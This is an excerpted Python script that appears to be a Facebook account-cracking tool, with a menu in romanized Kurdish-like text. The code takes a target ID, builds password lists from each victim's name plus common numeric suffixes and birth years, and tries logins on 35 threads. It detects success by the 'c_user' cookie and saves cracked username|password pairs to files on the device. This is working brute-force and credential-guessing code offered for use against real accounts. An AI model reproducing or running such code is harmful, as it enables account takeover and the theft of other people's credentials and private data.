...
"""%(BM))
		print(
			"""\033[1;95m
 (1) CRACK KRDN BA ID PUBLIC°`^´°
	(2) CRACK KRDN BA ID FOLLOWERS/
	(3) CRACK CRACK KRDN LA REGAE POSTAWA/
	(4) CHECK KRDNE cp W OK / KRDNAWA/
	(0) Logout/
			"""
		)
		chose = input("  Chooice: ")
		...
		if chose=='1' or chose=='2':
			...
			account_target = input("ID DABNE id: ")
			try:
	...
	def crack(self, user, password_list, url):
		...
		for pw in password_list:
			...
			if "c_user" in session.cookies.get_dict():
				ok.append(user+"|"+pw)
				open("/sdcard/succesfull.txt","a").write(user+"|"+pw+"\n")
				...
				cp.append(user+"|"+pw)
				open("/sdcard/checkpoint.txt","a").write(user+"|"+pw+"\n")
				h2 = {
				...
				opsi.clear()
				break
			sys.stdout.write("\r\033[1;97m<BARZAN> %s/%s\033[1;92mOK|\033[1;91mCP:%s/%s"%(len(loop),len(data_id),len(ok),len(cp)))
			sys.stdout.flush()
		loop.append("memek")
...
class Assets(Main):
	...
	@property
	def validate(self):
		add = input(" [y/n]DATAWE BAXOT PASS DABNEY ")
		if add=="y":
			pas = self._password_split
		print(
			"\033[1;91m TKAYA CHAWAREKA TA 15 DAQA \n"
		)
		print("\033[1;92m Save succesfull ==>>  /sdcard/succesfull.txt")
		print("\033[1;91m Save checkpoint ==>> /sdacrd/checkpoint.txt")
		with ThreadPoolExecutor(max_workers=35) as kirim:
			for x in self.data_id:
				...
				name = namee.split(" ")
				if(len(name[0])>=6):
					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'11223344',name[0]+'12',name[0]+'123123',name[0]+'123456789',name[0]+'12345678',name[0]+'123321',name[0]+'1122334455',name[0]+'12341234',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999',name[0]+'2000',name[0]+'2001',name[0]+'2002',name[0]+'2003',name[0]+'2004',name[0]+'2005',name[0]+'2006',name[0]+'2007',name[0]+'2008']
				elif(len(name[0])<=2):
					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'11223344',name[0]+'12',name[0]+'123123',name[0]+'123456789',name[0]+'12345678',name[0]+'123321',name[0]+'1122334455',name[0]+'12341234',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999',name[0]+'2000',name[0]+'2001',name[0]+'2002',name[0]+'2003',name[0]+'2004',name[0]+'2005',name[0]+'2006',name[0]+'2007',name[0]+'2008']
				else:
					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'11223344',name[0]+'12',name[0]+'123123',name[0]+'123456789',name[0]+'12345678',name[0]+'123321',name[0]+'1122334455',name[0]+'12341234',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999',name[0]+'2000',name[0]+'2001',name[0]+'2002',name[0]+'2003',name[0]+'2004',name[0]+'2005',name[0]+'2006',name[0]+'2007',name[0]+'2008']
...
def _login():
	try:
		...
		print("""
PPPPPP   OOOOO  LL      EEEEEEE  SSSSS  
PP   PP OO   OO LL      EE      SS      
PPPPPP  OO   OO LL      EEEEE    SSSSS  
PP      OO   OO LL      EE           SS 
PP       OOOO0  LLLLLLL EEEEEEE  SSSSS  
